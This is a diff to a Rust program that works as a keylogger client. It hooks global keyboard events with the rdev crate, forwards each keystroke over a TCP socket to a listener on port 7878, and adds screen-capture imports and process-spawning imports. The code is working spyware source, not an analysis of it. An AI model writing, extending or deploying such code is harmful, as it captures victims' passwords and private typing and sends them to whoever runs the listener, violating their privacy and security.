@@ -1,21 +1,60 @@
 use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
 use tokio::sync::mpsc;
-use tokio::task;
 use tokio::net::TcpStream;
 use std::process::Command;
 use std::os::windows::process::CommandExt;
 use rdev::{Event, listen};
+#[allow(unused)]
+use scrap::{Capturer, Display};
+
+trait ToBeBytes {
+    fn as_bytes(&self) -> &[u8];
+}
+
+trait Bytes {
+    fn push_str(&mut self, s: &str);
+}
+
+
+impl ToBeBytes for String {
+    fn as_bytes(&self) -> &[u8] {
+        String::as_bytes(self)
+    }
+}
+
+impl Bytes for String {
+    fn push_str(&mut self, s: &str) {
+        String::push_str(self, s);
+    }
+}
+
+enum Data<T> {
+    Keystroke(T),
+}
+
+impl<T: ToBeBytes + Bytes> Data<T> {
+    fn process(&mut self) -> &[u8] {
+        match self {
+            Data::Keystroke(data) => {
+                data.push_str("keystroke_reader");
+                data.as_bytes()
+            }
+        }
+    }
+}
 
 #[tokio::main]
 async fn main() -> io::Result<()> {
     let socket = TcpStream::connect("127.0.0.1:7878").await?;
     let (mut rd, mut wr) = io::split(socket);
-    let (sender, mut receiver) = mpsc::channel(8);
+    let (tx, mut rx) = mpsc::channel(16);
 
-    task::spawn_blocking( || {
+    // spawn blocking for reading client keystrokes synchronously
+    // crate rdev do not support async
+    tokio::task::spawn_blocking( || {
         let callback = move |event: Event| {
             match event.name {
-                Some(string) => sender.blocking_send(string).expect(""),
+                Some(string) => tx.blocking_send(Data::Keystroke(string)).expect("cannot send data"),
                 None => (),
             }
         };
@@ -25,9 +64,11 @@ async fn main() -> io::Result<()> {
         }
     });
 
-    tokio::spawn(async move {
-        while let Some(string) = receiver.recv().await {
-            wr.write_all(string.as_bytes()).await?;
+    // receiving data from mpsc channel
+    // then writing data to tcp stream
+    tokio::spawn(async move  {
+        while let Some(mut data) = rx.recv().await {
+            wr.write_all(data.process()).await?;
         }
 
         Ok::<_, io::Error>(())
